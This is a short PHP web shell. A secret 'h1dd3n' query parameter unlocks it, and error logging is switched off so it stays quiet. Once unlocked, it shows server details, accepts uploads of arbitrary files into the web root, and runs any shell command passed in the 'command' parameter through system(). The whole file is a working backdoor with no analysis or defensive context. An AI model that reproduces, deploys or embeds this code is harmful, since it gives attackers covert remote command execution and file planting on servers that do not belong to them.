<?php
error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);

if(isset($_GET['h1dd3n']))
{
echo "<b>".php_uname()."</b><br>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='files'>
	  <input type='submit' name='upload' value='upload'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['files']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['files']['tmp_name'], $dest)) {
			$web = "//".$_SERVER['HTTP_HOST']."/";
			echo "Success upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "Fail upload in directory root.";
		}
	} else {
		if(@copy($_FILES['files']['tmp_name'], $files)) {
			echo "Success upload <b>$files</b> in this folder.";
		} else {
			echo "Fail upload";
		}
	}
}
if(isset($_REQUEST['command'])){system($_REQUEST['command']);}else{echo '<font color="lime">\n';}__halt_compiler();
}
?>
